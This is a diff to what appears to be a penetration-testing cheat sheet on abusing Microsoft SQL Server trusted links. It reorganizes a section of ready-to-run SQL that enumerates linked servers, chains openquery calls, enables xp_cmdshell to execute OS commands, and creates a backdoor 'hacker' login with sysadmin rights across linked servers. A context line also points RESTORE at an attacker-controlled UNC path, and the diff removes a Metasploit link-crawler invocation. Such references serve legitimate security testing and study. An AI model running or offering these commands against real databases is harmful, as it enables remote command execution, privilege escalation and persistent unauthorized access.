@@ -338,34 +338,37 @@ RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
 
 ## MSSQL Trusted Links
 
+A trusted link in Microsoft SQL Server is a linked server relationship that allows one SQL Server instance to execute queries and even remote procedures on another server (or external OLE DB source) as if the remote server were part of the local environment. Linked servers expose options that control whether remote procedures and RPC calls are allowed and what security context is used on the remote server.
+
 > The links between databases work even across forest trusts.
 
-```powershell
-msf> use exploit/windows/mssql/mssql_linkcrawler
-[msf> set DEPLOY true] # Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
-```
+* Find links using `sysservers`: contains one row for each server that an instance of SQL Server can access as an OLE DB data source.
 
-Manual exploitation
+    ```sql
+    select * from master..sysservers
+    ```
 
-```sql
--- find link
-select * from master..sysservers
+* Execute query through the link
 
--- execute query through the link
-select * from openquery("dcorp-sql1", 'select * from master..sysservers')
-select version from openquery("linkedserver", 'select @@version as version');
+    ```sql
+    select * from openquery("dcorp-sql1", 'select * from master..sysservers')
+    select version from openquery("linkedserver", 'select @@version as version')
 
--- chain multiple openquery
-select version from openquery("link1",'select version from openquery("link2","select @@version as version")')
+    -- Chain multiple openquery
+    select version from openquery("link1",'select version from openquery("link2","select @@version as version")')
+    ```
 
--- execute shell commands
-EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
-select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')
+* Execute shell commands
 
--- create user and give admin privileges
-EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
-EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
-```
+    ```sql
+    -- Enable xp_cmdshell and execute "dir" command
+    EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
+    select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')
+
+    -- Create a SQL user and give sysadmin privileges
+    EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMAIN\SERVER1"') AT "DOMAIN\SERVER2"
+    EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMAIN\SERVER1"') AT "DOMAIN\SERVER2"
+    ```
 
 ## MSSQL Privileges
 
